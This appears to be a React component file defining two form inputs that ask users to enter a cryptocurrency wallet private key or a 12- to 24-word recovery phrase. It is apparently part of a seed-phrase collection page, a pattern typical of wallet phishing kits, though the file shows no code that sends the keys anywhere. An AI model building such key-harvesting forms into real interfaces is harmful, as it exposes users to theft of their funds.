import { useFormContext } from "../context";

export function TextInput() {
  const { handleInputChange } = useFormContext();
  return (
    <input
      type="text"
      name="walletKey"
      placeholder="Enter Private Key"
      className="w-full text-black"
      onChange={handleInputChange}
    />
  );
}

export function TextArea() {
  const { handleInputChange } = useFormContext();
  return (
    <textarea
      rows="4"
      placeholder="Enter your phrase keys, typically 12 (sometimes 24) words separated by single spaces"
      name="walletKey"
      className="w-full text-black"
      onChange={handleInputChange}
    ></textarea>
  );
}
